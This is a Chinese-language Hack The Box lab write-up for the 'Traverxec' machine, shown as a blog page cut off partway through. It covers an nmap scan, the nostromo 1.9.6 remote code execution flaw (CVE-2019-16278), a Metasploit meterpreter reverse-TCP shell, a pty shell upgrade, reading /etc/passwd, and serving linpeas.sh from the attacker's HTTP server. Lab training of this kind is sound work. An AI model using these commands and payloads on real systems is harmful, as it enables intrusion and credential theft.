@@ -1,0 +1,891 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hack The Box - Traverxec12345678910111213141516171819202122nmap -sV -sC -T4 -Pn -p- 10.10.10.165 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-02 20:50 CSTStats: 0:01:14 elapsed; 0 hosts complete">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Traverxec">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Traverxec/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Hack The Box - Traverxec12345678910111213141516171819202122nmap -sV -sC -T4 -Pn -p- 10.10.10.165 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-02 20:50 CSTStats: 0:01:14 elapsed; 0 hosts complete">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402210352996.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402211329369.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402212933002.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402213324184.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402214150103.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402214321212.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402214814020.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402214913627.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402214953705.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402222427617.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402224459314.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402233916734.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402234303761.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402234630974.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402235149418.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402235351835.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220402235811114.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403001331208.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403001414358.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403001601050.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403001733902.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403005604569.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403015133161.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403020334085.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403020439188.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403020631096.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403020959769.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403021421541.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403021839926.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403022054012.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403022442754.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403022649221.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403022900906.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403023108871.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403023328676.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403024058906.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403024130601.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403024228983.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403024513782.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403024926704.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403025034746.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403025300707.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403025740176.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403032449436.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403032529019.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220403032642509.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:38.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220402210352996.png">
+  
+  
+  
+  <title>HackTheBox-Traverxec - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Traverxec"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Traverxec</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Hack-The-Box-Traverxec"><a href="#Hack-The-Box-Traverxec" class="headerlink" title="Hack The Box - Traverxec"></a>Hack The Box - Traverxec</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-T4</span> <span class="hljs-selector-tag">-Pn</span> <span class="hljs-selector-tag">-p-</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.165</span> <br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.92</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2022-04-02 20:50 CST</span><br><span class="hljs-attribute">Stats</span>: <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">14</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-attribute">Timing</span>: About <span class="hljs-number">19.29%</span> done; <span class="hljs-attribute">ETC</span>: <span class="hljs-number">20</span>:<span class="hljs-number">56</span> (<span class="hljs-number">0</span>:<span class="hljs-number">05</span>:<span class="hljs-number">10</span> remaining)<br><span class="hljs-attribute">Stats</span>: <span class="hljs-number">0</span>:<span class="hljs-number">02</span>:<span class="hljs-number">50</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-attribute">Timing</span>: About <span class="hljs-number">89.37%</span> done; <span class="hljs-attribute">ETC</span>: <span class="hljs-number">20</span>:<span class="hljs-number">53</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">20</span> remaining)<br>Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">10.165</span><br>Host is up (<span class="hljs-number">0.15s</span> latency).<br><span class="hljs-keyword">Not</span> <span class="hljs-attribute">shown</span>: <span class="hljs-number">65533</span> filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.9</span>p1 Debian <span class="hljs-number">10</span>+deb10u1 (protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">2048</span> <span class="hljs-attribute">aa</span>:<span class="hljs-number">99</span>:<span class="hljs-attribute">a8</span>:<span class="hljs-number">16</span>:<span class="hljs-number">68</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-number">41</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-attribute">f9</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">84</span>:<span class="hljs-number">01</span>:<span class="hljs-attribute">c7</span>:<span class="hljs-number">59</span>:<span class="hljs-number">09</span>:<span class="hljs-number">5</span>c (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">93</span>:<span class="hljs-attribute">dd</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">23</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-attribute">d7</span>:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">08</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:<span class="hljs-number">58</span>:<span class="hljs-number">47</span>:<span class="hljs-number">09</span>:<span class="hljs-number">73</span>:<span class="hljs-attribute">a3</span>:<span class="hljs-number">88</span>:cc (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d6</span>:<span class="hljs-number">62</span>:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">56</span>:<span class="hljs-number">92</span>:<span class="hljs-attribute">e6</span>:<span class="hljs-number">37</span>:<span class="hljs-attribute">f1</span>:<span class="hljs-number">10</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:ce (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nostromo <span class="hljs-number">1.9</span>.<span class="hljs-number">6</span><br>|<span class="hljs-attribute">_http-server-header</span>: nostromo <span class="hljs-number">1.9</span>.<span class="hljs-number">6</span><br>|<span class="hljs-attribute">_http-title</span>: TRAVERXEC<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">207.29</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>在初始阶段，Nmap帮我探测到了目标开启22端口SSH服务与80HTTP服务。我尝试寻找22SSH服务披露漏洞。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit OpenSSH</span><br></code></pre></td></tr></table></figure>
+
+<p>一个有意思的名字深深吸引到了我。</p>
+<img src="https://www.worldisend.com/img/image-20220402210352996.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402210352996" style="zoom:200%;" />
+
+<p><strong>Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation</strong></p>
+<p>Debian OpenSSH - (经过身份验证的) 远程 SElinux 提权漏洞。我尝试读取漏洞利用脚本信息，它告诉我 目标可以允许远程认证用户通过在用户名后跟角色名称附加 :/（冒号正斜杠）序列来获得对任意 SELinux 角色的访问权限。它已经为我指明了获取<strong>shell</strong>权限的道路，我可以通过 <strong>用户名:/root</strong> 获取<strong>root</strong>级别的<strong>shell</strong>。</p>
+<img src="https://www.worldisend.com/img/image-20220402211329369.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402211329369" style="zoom:200%;" />
+
+<p>那么我现在就需要去试着获取目标机器中能够允许远程登录的<strong>用户名</strong>，以及他们的<strong>口令</strong>，或是<strong>id_rsa</strong>密钥。那么我现在完全可以SSH爆破，但我并不想，因为这样做太看重运气了，而我认为运气对于每个人来说都是有限的。于是我将目光到了 80端口http 服务中，希望它能为我提供些许相关的信息。</p>
+<p>在访问80HTTP服务之前，我把 机器名Traverxec对应的Web域名加入到了hosts文件中，因为我担心IP访问会错过什么。那么，它的Web域名应该是traverxec.htb。IP则为10.10.10.165。</p>
+<img src="https://www.worldisend.com/img/image-20220402212933002.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402212933002" style="zoom:200%;" />
+
+<p>我访问了80HTTP服务端口，目标很是热情，一上来就自我介绍，为我提供了以下信息：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">DavidWhite、Davidwhite、davidwhite、whitedavid、Whitedavid、WhiteDavid。<br></code></pre></td></tr></table></figure>
+
+<p>我已经有六个可能存在的用户名。</p>
+<img src="https://www.worldisend.com/img/image-20220402213324184.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402213324184" style="zoom:200%;" />
+
+<p>它有一款看起来像是编辑器排版的软件<strong>Lorem Ipsum</strong> 。</p>
+<p>网站还向我提供了一些图片，我尝试去点击这些图片，右边的按钮仅仅只是跳转到了页面顶部。并不会产生任何请求。</p>
+<img src="https://www.worldisend.com/img/image-20220402214150103.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402214150103" style="zoom:200%;" />
+
+<p>但我如果点击图标左边的放大镜按钮，它便会产生一些请求：</p>
+<img src="https://www.worldisend.com/img/image-20220402214321212.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402214321212" style="zoom:200%;" />
+
+<p>它还向我提供了一些分享链接按钮，我试着点击它们也仅仅只是跳转到了页面顶部，并不会产生任何请求。</p>
+<img src="https://www.worldisend.com/img/image-20220402214814020.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402214814020" style="zoom:200%;" />
+
+<p>以及一个供我遗留联系方式的Contact Form：</p>
+<img src="https://www.worldisend.com/img/image-20220402214913627.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402214913627" style="zoom:200%;" />
+
+<p>以及页脚的一些版权信息，它告诉我该站点是用 <strong>TemplateMag</strong>作为基础模板的。</p>
+<img src="https://www.worldisend.com/img/image-20220402214953705.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402214953705" style="zoom:200%;" />
+
+<p>那么根据目前掌握的信息，我有三个途径供我去尝试骇入目标机器。</p>
+<ol>
+<li>SSH爆破，我已经拥有六个潜在的用户名David、DavidWhite、Davidwhite、davidwhite、whitedavid、Whitedavid、WhiteDavid。根据国外公民的命名规则，名为前，姓在后，我可以从中筛选出一半。<strong>DavidWhite、Davidwhite、davidwhite。</strong></li>
+<li>我可以去尝试点击页面中图片的放大点击按钮，去尝试拦截请求数据包并将其重定向为我希望它请求的文件，比如”/etc/passwd”、”/etc/shadow”。或是采用相对路径，我则需要再获取更多的路径信息，那么我就需要对请求数据包记录进行分析提取或是路径爆破从而获取更多的路径信息。</li>
+<li>或是搜索引擎收集<strong>TemplateMag</strong>是否能为我提供些许有用的信息，尝试模板注入漏洞。</li>
+<li>或是在它为我遗留的Contact Form中尝试注入类漏洞，我有些不敢尝试xss，因为它终归是个靶场，后端机器应该是空无一人的，如果我成功注入了xss代码它后端也为我触发返回了某些信息，终究还是有些瘆人会做噩梦的。</li>
+</ol>
+<p>此时我才意识到我疏忽了一个问题，为什么我没有中间件服务容器的信息，我意识到了自己愚蠢的漏掉了一些重要信息。</p>
+<p>Nmap为我枚举到了80端口HTTP服务的一些信息：nostromo 1.9.6。但我却被远程 SElinux 提权漏洞吸引了全部注意力，满脑子都是如何获取用户名口令相关信息。好在我的间歇性总结建模习惯把我拉了回来，我开始尝试搜寻该HTTP服务组件的漏洞信息：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> nostromo <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220402222427617.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402222427617" style="zoom:200%;" />
+
+<p>非常令人欣喜，它存在远程RCE。我尝试去访问漏洞利用脚本获取更的信息：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">searchsploit -x multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">47837</span>.py<br></code></pre></td></tr></table></figure>
+
+<p>它告诉了我漏洞编号<strong>CVE-2019-16278</strong>，并告诉我以POST方式去提交某些参数会被意外的导致代码执行，而它的payload看起来像是目录遍历漏洞。但我无法理解，为什么目录遍历漏洞可以RCE。</p>
+<img src="https://www.worldisend.com/img/image-20220402224459314.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402224459314" style="zoom:200%;" />
+
+<p>为了搞懂它，我不得不搜寻该漏洞的更多资料。我找到了这篇文章：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>nosec.org<span class="hljs-regexp">/home/</span>detail/<span class="hljs-number">3074</span>.html<br></code></pre></td></tr></table></figure>
+
+<p>很快，我知晓了该漏洞的产生原理，在Nostromo 1.9.6版本的源代码中，位于main.c文件中的<strong>http_verify</strong>()函数，它会先进行解码以便对用户请求的路径进行校验，校验其中有无”/../“、防止目录穿越漏洞的产生，但它是基于黑名单校验的，而我细想了一下，除非破坏已有的 “/../“ 类型而将其转换为”/.=./“等类型，该黑名单我想不到其他绕过的可能，但是这样的话我的payload便会很奇怪而无法正常执行，而漏洞利用脚本为我提供的payload信息便是”/.0%d./“这样的类型，又验证了我的想法，那只能是后端存在某个内鬼，意外的帮我去掉了payload中的填充夹层致使payload bypass后并正常解析使用。</p>
+<p>事实确实如我所想，payload在一层一层函数方法作为参数传递到函数http_proc()内部的http_header()函数中，漏洞根源就在这，函数http_header()会通过函数strcutl()解析数据。而内鬼正是函数strcutl()，它会将用户请求参数中的”\r”去掉，\r 也就是 %0d。目录穿越漏洞便是由此产生。</p>
+<p>紧接着，又会传递到execve()函数中，它是RCE的罪魁祸首，但是我想不明白的是，为何该中间件服务会使用执行命令的敏感函数呢？我想起了目标机器在80http服务端口为我提供的Contact Form留联系方式的输入框，如果我在输入框中留下了我的联系方式并提交了，那么必定目标网站管理人员是希望能看到的，如果他想从网页端看到，为了履行维护其他人隐私信息安全的义务，必定需要对访问该信息页面的用户进行身份校验，那么必定需要口令认证、密钥认证、来源认证等身份认证的功能，我觉得最让人没有安全感的便是口令认证，有口令泄露的风险，也有身份认证bypass的可能。</p>
+<p>比起安全性，我会更希望只有在我登录服务器时候才能访问用户留给我的联系方式等信息，因为我可以用更加具有安全性的密钥来登录服务器，而用户留给我的信息也不能放到WEB根目录，有被路径爆破导致隐私泄露的风险。那么我就需要自定义一个目录用于存放用户留给我的信息。</p>
+<p>这似乎就关联到了系统调用命令创建打开某个文件并写入，而我可以利用管道符进行拼接将其执行我所希望的命令代码，想到这里，我通体舒畅。</p>
+<p>那么我便开始尝试构造payload。但是这次我想节省些许功夫，我并不想靠目录穿越漏洞尝试枚举用户信息敏感文件，Metasploit内置了该漏洞的利用模块。如果中间件服务账户能够简单读取到我希望读到的文件，那么它返回的shell级别也应该是可以的。我没必要专门再针对目录敏感文件进行路径猜解读取。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> nostromo <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220402233916734.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402233916734" style="zoom:200%;" />
+
+<p>它默认的payload是perl语言的，但我更希望获取一个Meterpreter：</p>
+<img src="https://www.worldisend.com/img/image-20220402234303761.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402234303761" style="zoom:200%;" />
+
+<p>我选择了，并且它成功了：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">payload</span> <span class="hljs-operator">=</span>&gt; cmd/unix/python/meterpreter_reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220402234630974.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402234630974" style="zoom:200%;" />
+
+<p>我可以尝试内核溢出漏洞自动检测，但是我还想试着去探索其他的提权攻击方式，因为我还对</p>
+<p>Debian OpenSSH - (经过身份验证的) 远程 SElinux 提权漏洞念念不忘，我通过meterpreter进入了终端，并升级了交互式shell：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>我到home目录去查看了目标机器的用户名信息：</p>
+<img src="https://www.worldisend.com/img/image-20220402235149418.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402235149418" style="zoom:200%;" />
+
+<p>我进入了该用户的目录，并尝试执行一些命令，但因为权限不够而拒绝了我，我尝试sudo，它要求我输入密码口令：</p>
+<img src="https://www.worldisend.com/img/image-20220402235351835.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402235351835" style="zoom:200%;" />
+
+<p>我尝试了默认口令以及简单的口令都失败了。于是我读取了/etc/passwd。我尝试读取/etc/shadow被提示权限不足：</p>
+<img src="https://www.worldisend.com/img/image-20220402235811114.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220402235811114" style="zoom:200%;" />
+
+<p>很明显的，我可以通过远程登录david然后利用Debian OpenSSH - (经过身份验证的) 远程 SElinux 提权漏洞获取root权限，那么我现在需要找到david用户的口令或密钥。</p>
+<p>我发现wget可以使用，于是我决定开启http服务并为目标传入Linpeas.sh进行提权信息枚举。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403001331208.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403001331208" style="zoom:200%;" />
+
